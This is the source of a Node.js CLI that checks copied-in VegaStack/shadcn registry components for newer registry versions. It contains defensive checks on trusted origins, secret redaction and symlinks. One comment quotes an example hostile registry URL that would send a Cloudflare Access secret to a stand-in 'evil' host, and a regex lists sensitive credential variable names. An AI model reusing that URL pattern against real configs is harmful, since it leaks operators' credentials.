#!/usr/bin/env node
// vegastack-design check-updates — show which copied-in VegaStack components have a newer version
// published in the registry, so you know what to re-pull. shadcn registries are copy-in ("you own
// the code") with NO automatic updates; this turns that into a single command.
//
// HOW IT WORKS (one index request + bounded item requests for installed copies):
//   1. Resolve the @vegastack registry url + auth headers from components.json (or env).
//   2. Scan the components dir for files carrying the provenance header the registry stamps:
//        // @vegastack <name>@<version> sha256-<integrity>
//      That header IS the version pin recorded at copy-in time.
//   3. Fetch the registry INDEX once (…/registry.json) — every item carries meta.version + meta.integrity.
//   4. Compare BY HASH (not version number): if the published integrity differs from the one in your
//      header, that component changed → an update is available. (Comparing by hash avoids false
//      "update" noise when the global version bumps but a given component's content didn't change.)
//
// It does NOT detect local edits to a component's body (the header is the PUBLISHED hash, not a hash
// of your current file) — that is what `vegastack-design verify --post-write` is for. The footer
// reminds you to `git diff` before `--overwrite`.
//
// Usage:
//   npx vegastack-design check-updates
//   npx vegastack-design check-updates --filter button,dialog --json
//   npx vegastack-design check-updates --fail-on-update     # CI drift gate (exit 1 if stale)
import { readFileSync, readdirSync, lstatSync, existsSync } from "node:fs";
import { join, resolve, basename, relative, sep } from "node:path";
import { pathToFileURL } from "node:url";
import {
  itemHash,
  rewriteRegistryAliases,
  stripShadcnLeadingCommentPrologue,
} from "./verify-registry-item.mjs";

const ITEM_NAME_SOURCE = "[a-z0-9]+(?:-[a-z0-9]+)*";
const VERSION_SOURCE =
  "[0-9]+\\.[0-9]+\\.[0-9]+(?:-[0-9A-Za-z.-]+)?(?:\\+[0-9A-Za-z.-]+)?";
const ITEM_NAME_RE = new RegExp(`^${ITEM_NAME_SOURCE}$`);
const VERSION_RE = new RegExp(`^${VERSION_SOURCE}$`);
const PROVENANCE_RE = new RegExp(
  `^// @vegastack (${ITEM_NAME_SOURCE})@(${VERSION_SOURCE}) sha256-([A-Za-z0-9+/=]+)$`,
);
const DEFAULT_REGISTRY = "https://design.vegastack.com/r";
const DEFAULT_TRUSTED_REGISTRY_ORIGIN = new URL(DEFAULT_REGISTRY).origin;
const REQUEST_TIMEOUT_MS = 15_000;
const SKIP_DIRS = new Set([
  "node_modules",
  ".next",
  ".git",
  "dist",
  ".turbo",
  "out",
]);

const USAGE = `vegastack-design check-updates — show which copied-in components have newer registry versions

Usage: vegastack-design check-updates [options]

Options:
  --dir <path>        Components directory (default: components.json aliases.ui, else components/ui)
  --filter <names>    Comma-separated component names (supports * globs)
  --json              Machine-readable output
  --fail-on-update    Exit 1 if any component has an update (for CI)
  --registry <url>    Override registry URL template (…/{name}.json)
  --cwd <path>        Project root holding components.json (default: cwd)
  --no-color          Disable ANSI colors
  -h, --help          Show this help

Config: reads the @vegastack registry url + headers from components.json; \${ENV} placeholders expand
from .env.local / .env or the shell; falls back to VEGASTACK_REGISTRY + CF_ACCESS_CLIENT_ID/SECRET.
Credentialed custom registries additionally require VEGASTACK_TRUSTED_REGISTRY_ORIGIN in the
process environment (not a checkout-local dotenv file). Redirects are rejected.`;

// ── arg parsing ────────────────────────────────────────────────────────────────────────────────
function parseArgs(argv) {
  const out = {
    filter: null,
    json: false,
    failOnUpdate: false,
    noColor: false,
    dir: null,
    cwd: ".",
    registry: null,
    help: false,
  };
  for (let i = 0; i < argv.length; i++) {
    const a = argv[i];
    if (a === "--help" || a === "-h") out.help = true;
    else if (a === "--json") out.json = true;
    else if (a === "--fail-on-update") out.failOnUpdate = true;
    else if (a === "--no-color") out.noColor = true;
    else if (
      a === "--dir" ||
      a === "--cwd" ||
      a === "--registry" ||
      a === "--filter"
    ) {
      const value = argv[i + 1];
      if (!value || value.startsWith("-"))
        throw new UsageError(`${a} requires a value`);
      i++;
      if (a === "--dir") out.dir = value;
      else if (a === "--cwd") out.cwd = value;
      else if (a === "--registry") out.registry = value;
      else out.filter = value;
    } else throw new UsageError(`unknown option: ${a}`);
  }
  return out;
}
class UsageError extends Error {}

// ── env expansion + config resolution ────────────────────────────────────────────────────────────
// shadcn expands ${VAR} in components.json from .env.local/.env too, so we load them (process/shell
// env still wins) — otherwise the gated prod registry would 403 here while `shadcn add` succeeds.
let ENV = process.env;
function loadEnv(cwd) {
  const merged = {};
  for (const f of [".env", ".env.local"]) {
    let txt;
    try {
      txt = readFileSync(join(cwd, f), "utf8");
    } catch {
      continue;
    }
    for (const raw of txt.split("\n")) {
      const line = raw.trim();
      if (!line || line.startsWith("#")) continue;
      const eq = line.indexOf("=");
      if (eq === -1) continue;
      const key = line.slice(0, eq).trim();
      let val = line.slice(eq + 1).trim();
      if (
        (val.startsWith('"') && val.endsWith('"')) ||
        (val.startsWith("'") && val.endsWith("'"))
      )
        val = val.slice(1, -1);
      merged[key] = val;
    }
  }
  return { ...merged, ...process.env }; // process/shell env wins (dotenv semantics)
}

const missingEnv = new Set();

/**
 * Credential material seen during config expansion: secret value -> `${NAME}` placeholder.
 *
 * Two independent jobs, both required:
 *   1. `assertNoSecretInUrl` refuses to BUILD a request URL containing any of these, so a
 *      components.json like `"@vegastack": "http://evil/r/{name}.json?k=${CF_ACCESS_CLIENT_SECRET}"`
 *      can never be fetched. That config carries no headers, so the header-scoped trusted-origin
 *      check below never fired and the token was exfiltrated to an arbitrary origin over plain
 *      http — while the CLI exited 0.
 *   2. `redact` scrubs them from every line this CLI prints (see terminalText), because the same
 *      URL was echoed verbatim into stderr and therefore into CI logs.
 *
 * Credentials belong in headers, never in a URL — a URL lands in server access logs, proxy logs,
 * and CDN caches even when the origin is fully trusted. So (1) is unconditional, not origin-scoped.
 */
const SECRET_VALUES = new Map();

// Name-based classification, applied at expansion time wherever the variable is used. Anything
// used as a header value is ALSO registered as secret regardless of its name (see resolveRegistry),
// which covers credential halves like CF_ACCESS_CLIENT_ID and any custom auth header.
const SENSITIVE_ENV_NAME =
  /(?:SECRET|TOKEN|PASSWORD|PASSWD|CREDENTIAL|PRIVATE|API_?KEY|_KEY$|^KEY$|AUTH|SESSION|COOKIE|BEARER|SIGNATURE)/i;

// Known credential variables whose NAME the pattern above would not catch. CF_ACCESS_CLIENT_ID is
// half of a Cloudflare Access service-token pair: on its own it is not sufficient to authenticate,
// but it is credential material and must not be logged or placed in a URL either.
const KNOWN_CREDENTIAL_ENV_NAMES = new Set(["CF_ACCESS_CLIENT_ID"]);

function isSensitiveEnvName(name) {
  return KNOWN_CREDENTIAL_ENV_NAMES.has(name) || SENSITIVE_ENV_NAME.test(name);
}

// Deliberate floor, applied to BOTH redaction and the URL bar. A short value cannot be treated as
// a secret by substring matching without breaking legitimate use: with a 4-char token, every URL
// merely CONTAINING those characters would be refused, and every log line mangled. Real credentials
// here are long (a Cloudflare Access service-token secret is 64 hex chars), so the floor costs
// nothing in practice — but it does mean a hand-rolled sub-8-character token is not protected.
const MIN_SECRET_LENGTH = 8;

/**
 * @param label  env var name (kind 'env') or HTTP header name (kind 'header')
 * @param kind   controls the placeholder shown in errors/logs, so the message points at the thing
 *               the operator actually has to edit rather than at a header name dressed up as `${…}`.
 */
function rememberSecret(label, value, kind = "env") {
  if (typeof value !== "string" || value.length < MIN_SECRET_LENGTH) return;
  const placeholder =
    kind === "header" ? `<${label} header value>` : `\${${label}}`;
  // First registration wins: an env-var placeholder is more actionable than a header one, and
  // envHeaders()/expandEnv() run before the header sweep for the same value.
  if (!SECRET_VALUES.has(value)) SECRET_VALUES.set(value, placeholder);
}

function expandEnv(value) {
  if (typeof value !== "string") return value;
  return value.replace(/\$\{([A-Z0-9_]+)\}/gi, (_, name) => {
    const v = ENV[name];
    if (v == null || v === "") missingEnv.add(name);
    if (v && isSensitiveEnvName(name)) rememberSecret(name, v);
    return v ?? "";
  });
}

/** Replace every known secret with its `${NAME}` placeholder, raw and percent-encoded. */
function redact(text) {
  let out = String(text);
  for (const [secret, placeholder] of SECRET_VALUES) {
    out = out.split(secret).join(placeholder);
    const encoded = encodeURIComponent(secret);
    if (encoded !== secret) out = out.split(encoded).join(placeholder);
  }
  return out;
}

/**
 * Refuse any request URL carrying credential material. Checked raw AND percent-encoded, since a
 * secret with reserved characters is escaped once it is interpolated into a query string.
 */
function assertNoSecretInUrl(url) {
  const text = String(url);
  for (const [secret, placeholder] of SECRET_VALUES) {
    if (
      text.includes(secret) ||
      (encodeURIComponent(secret) !== secret &&
        text.includes(encodeURIComponent(secret)))
    ) {
      throw new Error(
        `refusing to put ${placeholder} in a registry URL — credentials must be sent as headers, ` +
          `never in a URL (URLs are recorded in access, proxy, and CDN logs). ` +
          `Move it to the "headers" object of the @vegastack registry in components.json.`,
      );
    }
  }
}

function readJson(path) {
  return JSON.parse(readFileSync(path, "utf8"));
}

function envHeaders() {
  const h = {};
  if (ENV.CF_ACCESS_CLIENT_ID)
    h["CF-Access-Client-Id"] = ENV.CF_ACCESS_CLIENT_ID;
  if (ENV.CF_ACCESS_CLIENT_SECRET)
    h["CF-Access-Client-Secret"] = ENV.CF_ACCESS_CLIENT_SECRET;
  // These reach the wire as credentials whether or not they were ever written as ${…} in a config,
  // so register them here as well — redaction and the URL bar must not depend on expansion order.
  rememberSecret("CF_ACCESS_CLIENT_ID", h["CF-Access-Client-Id"]);
  rememberSecret("CF_ACCESS_CLIENT_SECRET", h["CF-Access-Client-Secret"]);
  return h;
}

function nonEmptyHeaders(headers) {
  return Object.fromEntries(
    Object.entries(headers).filter(
      ([, value]) => value != null && value !== "",
    ),
  );
}

/**
 * Validate the complete request destination before attaching credentials. The trust anchor is
 * deliberately read from process.env rather than ENV: ENV also contains checkout-local .env files,
 * which must not be able to choose where an operator's service token is sent.
 */
function assertRegistryRequest(url, headers) {
  let parsed;
  try {
    parsed = new URL(url);
  } catch {
    // redact: an unparseable URL is still printed, and it may carry an interpolated secret.
    throw new Error(`registry URL is invalid: ${redact(url)}`);
  }
  if (parsed.username || parsed.password) {
    throw new Error("registry URL must not contain embedded credentials");
  }
  // Unconditional, and BEFORE the header-scoped origin check below: a URL-borne secret is a leak
  // even to the trusted origin, and this is the only thing standing between a hostile
  // components.json and an arbitrary-origin exfiltration (the origin check never fires for a
  // config that declares no headers).
  assertNoSecretInUrl(url);
  const credentialed = Object.keys(nonEmptyHeaders(headers)).length > 0;
  if (!credentialed) return parsed;

  const trustedValue =
    process.env.VEGASTACK_TRUSTED_REGISTRY_ORIGIN ??
    DEFAULT_TRUSTED_REGISTRY_ORIGIN;
  let trusted;
  try {
    trusted = new URL(trustedValue);
  } catch {
    throw new Error(
      "VEGASTACK_TRUSTED_REGISTRY_ORIGIN must be an absolute HTTPS origin",
    );
  }
  if (
    trusted.protocol !== "https:" ||
    trusted.username ||
    trusted.password ||
    trusted.pathname !== "/" ||
    trusted.search ||
    trusted.hash
  ) {
    throw new Error(
      "VEGASTACK_TRUSTED_REGISTRY_ORIGIN must be an HTTPS origin with no path, credentials, query, or hash",
    );
  }
  if (parsed.protocol !== "https:" || parsed.origin !== trusted.origin) {
    throw new Error(
      `refusing to send registry credentials to ${parsed.origin}; trusted origin is ${trusted.origin}`,
    );
  }
  return parsed;
}

async function fetchRegistry(url, headers) {
  assertRegistryRequest(url, headers);
  return fetch(url, {
    headers: nonEmptyHeaders(headers),
    redirect: "error",
    signal: AbortSignal.timeout(REQUEST_TIMEOUT_MS),
  });
}

// Resolve { urlTemplate, headers } in precedence order: --registry > components.json > env.
function resolveRegistry(opts, componentsJson) {
  if (opts.registry) {
    return { urlTemplate: opts.registry, headers: envHeaders() };
  }
  const reg = componentsJson?.registries?.["@vegastack"];
  if (reg) {
    if (typeof reg === "string")
      return { urlTemplate: expandEnv(reg), headers: {} };
    const headers = {};
    for (const [k, v] of Object.entries(reg.headers ?? {})) {
      headers[k] = expandEnv(v);
      // Anything used as a header value IS credential material, whatever the variable is called.
      // This catches credential halves the name heuristic would miss (CF_ACCESS_CLIENT_ID) and any
      // custom auth header, so those values are redacted from output and barred from URLs too.
      rememberSecret(k, headers[k], "header");
    }
    return { urlTemplate: expandEnv(reg.url), headers };
  }
  return {
    urlTemplate: `${(ENV.VEGASTACK_REGISTRY ?? DEFAULT_REGISTRY).replace(/\/$/, "")}/{name}.json`,
    headers: envHeaders(),
  };
}

// Turn an item-url template into the index url: replace {name}→registry, else append /registry.json.
function indexUrl(urlTemplate) {
  if (urlTemplate.includes("{name}"))
    return urlTemplate.replace("{name}", "registry");
  return `${urlTemplate.replace(/\/$/, "")}/registry.json`;
}

// ── components dir + scan ──────────────────────────────────────────────────────────────────────
function resolveComponentsDir(cwd, dirFlag, componentsJson) {
  if (dirFlag) return resolve(cwd, dirFlag);
  const ui = componentsJson?.aliases?.ui;
  const rel = ui ? ui.replace(/^@\//, "").replace(/^~\//, "") : "components/ui";
  const direct = resolve(cwd, rel); // assumes @/ = project root
  if (existsSync(direct)) return direct;
  const srcVariant = resolve(cwd, "src", rel); // common alias: @/* -> src/*
  if (existsSync(srcVariant)) return srcVariant;
  return direct; // documented default; "none found" message hints --dir
}

function walk(dir, out = [], isRoot = true) {
  let rootStat;
  try {
    rootStat = lstatSync(dir);
  } catch {
    return out;
  }
  if (rootStat.isSymbolicLink()) {
    if (isRoot)
      throw new Error(`refusing to scan a symlinked component root: ${dir}`);
    return out;
  }
  if (!rootStat.isDirectory()) return out;
  let entries;
  try {
    entries = readdirSync(dir);
  } catch {
    return out;
  }
  for (const name of entries) {
    if (SKIP_DIRS.has(name)) continue;
    const p = join(dir, name);
    let s;
    try {
      s = lstatSync(p);
    } catch {
      continue;
    }
    // The requested component directory is the complete scan boundary. Following a symlink can
    // escape that boundary, traverse a very large unrelated tree, or recurse through a cycle.
    if (s.isSymbolicLink()) continue;
    if (s.isDirectory()) walk(p, out, false);
    else if (/\.tsx?$/.test(name)) out.push(p);
  }
  return out;
}

// Read a copied-in file. Returns { file, name, content, header? } where header is the parsed
// provenance line when present. The header is the fast path — but the REAL `shadcn add`
// pipeline strips leading comments during its transform, so most consumer copies have NO
// header. Headerless files are identified by filename against the registry index and compared
// by alias-normalized CONTENT instead (see `normalizeForCompare`).
function readInstalled(file, root) {
  let content;
  try {
    content = readFileSync(file, "utf8");
  } catch {
    return null;
  }
  const firstLine = content.slice(
    0,
    content.indexOf("\n") === -1 ? content.length : content.indexOf("\n"),
  );
  const m = PROVENANCE_RE.exec(firstLine);
  const name = basename(file).replace(/\.tsx?$/, "");
  const relativePath = relative(root, file).split(sep).join("/");
  return m
    ? {
        file,
        relativePath,
        name: m[1],
        content,
        header: { version: m[2], hash: `sha256-${m[3]}` },
      }
    : { file, relativePath, name, content, header: null };
}

// Strip a provenance header (with its optional following blank line) from file content.
function stripHeader(content) {
  return content.replace(
    /^\/\/ @vegastack \S+@\S+ sha256-\S+\r?\n(?:\r?\n)?/,
    "",
  );
}

/**
 * Normalize content for the headerless comparison: drop the provenance header, unify line
 * endings, rewrite the registry's canonical `@/…` import prefix to the consumer's alias root
 * (the same class of rewrite `shadcn add` performs), and ignore trailing whitespace.
 * Consumers on the default `@/*` alias need no rewrite at all.
 */
function normalizeForCompare(content, aliases) {
  let s = stripHeader(content).replace(/\r\n/g, "\n");
  s = rewriteRegistryAliases(s, aliases);
  return s.trimEnd() + "\n";
}

function expectedVariantsForCompare(content, label, aliases, fileType) {
  const exact = normalizeForCompare(content, aliases);
  const stripped = normalizeForCompare(
    stripShadcnLeadingCommentPrologue(content, label, fileType),
    aliases,
  );
  return new Set([exact, stripped]);
}

function uiTargetPath(file) {
  return typeof file?.target === "string" && file.target.startsWith("@ui/")
    ? file.target.slice("@ui/".length)
    : undefined;
}

async function mapLimit(values, limit, fn) {
  const results = new Array(values.length);
  let next = 0;
  await Promise.all(
    Array.from({ length: Math.min(limit, values.length) }, async () => {
      while (next < values.length) {
        const index = next++;
        results[index] = await fn(values[index], index);
      }
    }),
  );
  return results;
}

function globToRe(pattern) {
  return new RegExp(
    "^" +
      pattern
        .split("*")
        .map((s) => s.replace(/[.*+?^${}()|[\]\\]/g, "\\$&"))
        .join(".*") +
      "$",
  );
}

// ── colors ─────────────────────────────────────────────────────────────────────────────────────
function makeColor(enabled) {
  const wrap = (code) => (s) => (enabled ? `[${code}m${s}[0m` : s);
  return {
    yellow: wrap(33),
    green: wrap(32),
    dim: wrap(2),
    bold: wrap(1),
    red: wrap(31),
  };
}

// Registry errors, checkout paths, and command-line values may be attacker-controlled. Preserve the
// useful text while preventing terminal escape/control sequences from rewriting logs or prompts.
// Single chokepoint for everything this CLI prints: control-character scrub AND secret
// redaction. Redacting HERE rather than at each call site means a future console.error cannot
// reintroduce the leak by forgetting to wrap its argument — every existing print already routes
// through this, including the `could not reach the registry at ${url}` line that echoed the token.
function terminalText(value) {
  return redact(value).replace(/[\u0000-\u001f\u007f-\u009f]/g, "\uFFFD");
}

// ── main ─────────────────────────────────────────────────────────────────────────────────────────
export async function main(argv) {
  missingEnv.clear();
  let opts;
  try {
    opts = parseArgs(argv);
  } catch (err) {
    console.error(terminalText(err.message) + "\n");
    console.error(USAGE);
    return 2;
  }
  if (opts.help) {
    console.log(USAGE);
    return 0;
  }

  const cwd = resolve(opts.cwd);
  ENV = loadEnv(cwd); // pick up .env.local / .env (shadcn does the same)
  const color = makeColor(
    process.stdout.isTTY && !opts.noColor && !process.env.NO_COLOR,
  );

  // components.json (optional when --registry + --dir are both given)
  let componentsJson = null;
  const cjPath = join(cwd, "components.json");
  if (existsSync(cjPath)) {
    try {
      componentsJson = readJson(cjPath);
    } catch (err) {
      console.error(
        `✗ could not parse ${terminalText(cjPath)}: ${terminalText(err.message)}`,
      );
      return 2;
    }
  } else if (!opts.registry || !opts.dir) {
    console.error(
      `✗ no components.json found at ${terminalText(cjPath)} (need it for the registry config + components dir, or pass --registry and --dir)`,
    );
    return 2;
  }

  const { urlTemplate, headers } = resolveRegistry(opts, componentsJson);
  const idxUrl = indexUrl(urlTemplate);
  const dir = resolveComponentsDir(cwd, opts.dir, componentsJson);

  // fetch the registry index once (needed up front: headerless files are identified by
  // matching their filename against the index's item names)
  let index;
  try {
    const res = await fetchRegistry(idxUrl, headers);
    if (!res.ok) {
      console.error(
        `✗ registry index fetch failed: HTTP ${res.status} ${terminalText(res.statusText)} (${terminalText(idxUrl)})`,
      );
      if (missingEnv.size)
        console.error(
          `  hint: these auth env vars are unset: ${[...missingEnv].join(", ")}`,
        );
      return 2;
    }
    index = await res.json();
  } catch (err) {
    console.error(
      `✗ could not reach the registry at ${terminalText(idxUrl)}: ${terminalText(err.message)}`,
    );
    return 2;
  }
  if (!Array.isArray(index.items)) {
    console.error("✗ registry index has no items array");
    return 2;
  }
  const remote = new Map();
  const targetOwners = new Map();
  for (const item of index.items ?? []) {
    if (
      !item ||
      typeof item !== "object" ||
      Array.isArray(item) ||
      !ITEM_NAME_RE.test(item.name) ||
      !VERSION_RE.test(item.meta?.version ?? "") ||
      !Array.isArray(item.files) ||
      item.files.some(
        (file) => !file || typeof file !== "object" || Array.isArray(file),
      )
    ) {
      console.error("✗ registry index contains an invalid item identity");
      return 2;
    }
    if (remote.has(item.name)) {
      console.error("✗ registry index contains a duplicate item name");
      return 2;
    }
    remote.set(item.name, item);
    for (const file of item.files) {
      const target = uiTargetPath(file);
      if (!target) continue;
      if (targetOwners.has(target)) {
        console.error(
          "✗ registry index maps more than one item to the same @ui target",
        );
        return 2;
      }
      targetOwners.set(target, item.name);
    }
  }

  // scan for installed VegaStack components:
  //  - headered files (our own tooling / older CLIs preserve the provenance line) — always included
  //  - headerless files whose basename matches a registry item — the REAL `shadcn add` strips
  //    the header, so this is the normal consumer case
  //  - headerless files NOT in the index are skipped (they're the consumer's own components)
  let installedFiles;
  try {
    installedFiles = walk(dir);
  } catch (err) {
    console.error(`✗ ${terminalText(err.message)}`);
    return 2;
  }
  const grouped = new Map();
  for (const installedFile of installedFiles
    .map((file) => readInstalled(file, dir))
    .filter(Boolean)) {
    const itemName = installedFile.header
      ? installedFile.name
      : targetOwners.get(installedFile.relativePath);
    if (!itemName) continue;
    const group = grouped.get(itemName) ?? { name: itemName, files: [] };
    group.files.push(installedFile);
    grouped.set(itemName, group);
  }
  let installed = [...grouped.values()];
  if (opts.filter) {
    const res = opts.filter.split(",").map((s) => globToRe(s.trim()));
    installed = installed.filter((c) => res.some((re) => re.test(c.name)));
  }
  if (installed.length === 0) {
    if (opts.json)
      console.log(
        JSON.stringify(
          { registry: idxUrl, checked: 0, updates: 0, items: [] },
          null,
          2,
        ),
      );
    else
      console.log(
        `No VegaStack components found in ${terminalText(dir)}. (Add some with \`shadcn add @vegastack/<name>\`.)`,
      );
    return 0;
  }

  const aliases = componentsJson?.aliases ?? {};

  // Resolve each installed file by comparing alias-normalized CONTENT against the verified current
  // item. A provenance header is identity/version metadata only: trusting it without reading the
  // body would let a locally edited or backdoored file report `current` merely by retaining line 1.
  const itemUrlFor = (name) =>
    urlTemplate.includes("{name}")
      ? urlTemplate.replace("{name}", name)
      : `${urlTemplate.replace(/\/$/, "")}/${name}.json`;

  async function resolveStatus(group) {
    const r = remote.get(group.name);
    const firstHeader = group.files.find(({ header }) => header)?.header;
    if (!r)
      return {
        name: group.name,
        current: firstHeader?.version ?? null,
        latest: null,
        status: "missing",
      };

    const expectedTargets = (r.files ?? []).map(uiTargetPath).filter(Boolean);
    const installedByTarget = new Map(
      group.files.map((file) => [file.relativePath, file]),
    );
    const missingTargets = expectedTargets.filter(
      (target) => !installedByTarget.has(target),
    );
    const unexpectedTargets = group.files.filter(
      (file) => !expectedTargets.includes(file.relativePath),
    );
    if (missingTargets.length || unexpectedTargets.length) {
      return {
        name: group.name,
        current: firstHeader?.version ?? null,
        latest: r.meta.version,
        status: "drift",
        note: "installed file set differs from the registry item",
      };
    }

    try {
      const res = await fetchRegistry(itemUrlFor(group.name), headers);
      if (!res.ok) throw new Error(`HTTP ${res.status}`);
      const item = await res.json();
      if (item.name !== group.name || !Array.isArray(item.files)) {
        throw new Error("registry item identity/files contract mismatch");
      }
      const fetchedTargets = item.files.map(uiTargetPath).filter(Boolean);
      const sortedFetchedTargets = [...fetchedTargets].sort();
      const sortedExpectedTargets = [...expectedTargets].sort();
      if (
        new Set(fetchedTargets).size !== fetchedTargets.length ||
        sortedFetchedTargets.length !== sortedExpectedTargets.length ||
        sortedFetchedTargets.some(
          (target, index) => target !== sortedExpectedTargets[index],
        )
      ) {
        throw new Error(
          "registry item file-target set does not match the registry index contract",
        );
      }
      if (
        item.files.some(
          (entry) => uiTargetPath(entry) && typeof entry.content !== "string",
        )
      ) {
        throw new Error("registry item contains a non-string component file");
      }
      const computedIntegrity = itemHash(item);
      if (
        item.meta?.integrity !== computedIntegrity ||
        r.meta?.integrity !== computedIntegrity
      ) {
        throw new Error("registry item integrity does not match the index");
      }
      let same = true;
      for (const entry of item.files ?? []) {
        const target = uiTargetPath(entry);
        if (!target) continue;
        const local = installedByTarget.get(target);
        const expectedVariants = expectedVariantsForCompare(
          entry.content ?? "",
          target,
          aliases,
          entry.type,
        );
        if (
          !local ||
          !expectedVariants.has(normalizeForCompare(local.content, aliases))
        ) {
          same = false;
          break;
        }
      }
      const headerMatchesCurrent = group.files.every(
        ({ header }) =>
          !header || (r.meta?.integrity && header.hash === r.meta.integrity),
      );
      return {
        name: group.name,
        current: firstHeader?.version ?? null,
        latest: r.meta.version,
        status: same ? "current" : headerMatchesCurrent ? "drift" : "update",
      };
    } catch (err) {
      return {
        name: group.name,
        current: null,
        latest: r.meta.version,
        status: "error",
        note: `item fetch failed: ${err.message}`,
      };
    }
  }

  const rows = (await mapLimit(installed, 8, resolveStatus)).sort((a, b) => {
    const rank = { error: 0, update: 1, drift: 1, current: 2, missing: 3 };
    return rank[a.status] - rank[b.status] || a.name.localeCompare(b.name);
  });

  // A removed/renamed installed item is actionable drift too: silently treating it as current
  // leaves dead, unmaintained code in the consumer and defeats --fail-on-update.
  const updates = rows.filter(
    (r) =>
      r.status === "update" || r.status === "drift" || r.status === "missing",
  );
  const errors = rows.filter((r) => r.status === "error");

  if (opts.json) {
    console.log(
      JSON.stringify(
        {
          registry: idxUrl,
          checked: rows.length,
          updates: updates.length,
          errors: errors.length,
          items: rows,
        },
        null,
        2,
      ),
    );
    return errors.length ? 2 : opts.failOnUpdate && updates.length ? 1 : 0;
  }

  // human table
  const host = (() => {
    try {
      return (
        new URL(idxUrl).host +
        new URL(idxUrl).pathname.replace(/\/registry\.json$/, "")
      );
    } catch {
      return idxUrl;
    }
  })();
  console.log(
    `\nChecking ${rows.length} VegaStack component(s) against ${host} …\n`,
  );
  const nameW = Math.max(...rows.map((r) => r.name.length), 4);
  const GLYPH = {
    error: color.red("!"),
    update: color.yellow("⬆"),
    drift: color.yellow("≈"),
    current: color.green("✓"),
    missing: color.dim("?"),
  };
  for (const r of rows) {
    const ver =
      r.status === "update"
        ? `${r.current} → ${r.latest ?? "?"}`
        : r.status === "drift"
          ? `→ ${r.latest ?? "?"}`
          : (r.current ?? r.latest ?? "—");
    const note =
      r.status === "error"
        ? color.red(
            terminalText(r.note ?? "registry item could not be checked"),
          )
        : r.status === "update"
          ? color.yellow("update available")
          : r.status === "drift"
            ? color.yellow(
                "differs from registry (update or local edits — review with --diff)",
              )
            : r.status === "current"
              ? color.dim("up to date")
              : color.dim("not in registry (renamed/removed)");
    console.log(
      `  ${GLYPH[r.status]}  ${r.name.padEnd(nameW)}  ${String(ver).padEnd(16)}  ${note}`,
    );
  }
  console.log("");
  if (errors.length) {
    console.log(
      color.red(
        `${errors.length} registry item check(s) failed. No overwrite recommendation is safe until access/connectivity is restored.`,
      ),
    );
  } else if (updates.length) {
    const refreshable = updates.find((row) => row.status !== "missing");
    const removed = updates.filter((row) => row.status === "missing");
    console.log(color.bold(`${updates.length} actionable change(s) found.`));
    if (refreshable) {
      console.log("Review & apply registry updates (repeat per component):");
      console.log(
        `  npx shadcn@latest add @vegastack/${refreshable.name} --diff`,
      );
      console.log(
        `  npx shadcn@latest add @vegastack/${refreshable.name} --overwrite`,
      );
      console.log(
        color.dim(
          "\nNote: --overwrite replaces files; if you customized a component, git diff first.",
        ),
      );
    }
    if (removed.length) {
      console.log(
        color.yellow(
          `${removed.length} installed item(s) no longer exist in the registry; remove or migrate them deliberately.`,
        ),
      );
    }
  } else {
    console.log(color.green("Everything is up to date."));
  }

  return errors.length ? 2 : opts.failOnUpdate && updates.length ? 1 : 0;
}

export { terminalText };

// standalone execution (so `node check-updates.mjs` works; the dispatcher imports main() instead)
if (
  import.meta.url === pathToFileURL(process.argv[1] ?? "").href ||
  basename(process.argv[1] ?? "") === "check-updates.mjs"
) {
  main(process.argv.slice(2)).then((code) => process.exit(code));
}
